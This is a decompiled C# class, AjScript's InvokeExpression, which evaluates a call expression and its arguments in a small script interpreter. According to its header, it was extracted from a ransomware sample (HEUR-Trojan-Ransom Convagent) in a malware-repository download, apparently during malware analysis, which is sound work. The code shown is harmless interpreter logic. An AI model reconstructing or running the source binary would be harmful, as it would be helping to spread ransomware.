// Decompiled with JetBrains decompiler
// Type: AjScript.Expressions.InvokeExpression
// Assembly: CryptoAPITransf, Version=1.4.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 3C6B9EE6-9C07-49E4-80B0-30EE0F446F3E
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.05\HEUR-Trojan-Ransom.Win32.Convagent.gen-2c751eac7d8b2b4131c0622a8b5234b05661d29d6f5d49745e4bea13c6c01648.exe

using AjScript.Language;
using System;
using System.Collections.Generic;

namespace AjScript.Expressions
{
  [Serializable]
  public class InvokeExpression : IExpression
  {
    private IExpression expression;
    private ICollection<IExpression> arguments;

    public InvokeExpression(IExpression expression, ICollection<IExpression> arguments)
    {
      this.expression = expression;
      this.arguments = arguments;
    }

    public IExpression Expression => this.expression;

    public ICollection<IExpression> Arguments => this.arguments;

    public object Evaluate(IContext context)
    {
      object obj1 = (object) null;
      ICallable method = !(this.expression is ArrayExpression) ? (ICallable) this.expression.Evaluate(context) : (ICallable) ((ArrayExpression) this.expression).Evaluate(context, ref obj1);
      List<object> objectList = new List<object>();
      foreach (IExpression expression in (IEnumerable<IExpression>) this.arguments)
      {
        object obj2 = expression.Evaluate(context);
        objectList.Add(obj2);
      }
      return obj1 != null && obj1 is DynamicObject ? ((DynamicObject) obj1).Invoke(method, objectList.ToArray()) : method.Invoke(context, (object) null, objectList.ToArray());
    }
  }
}
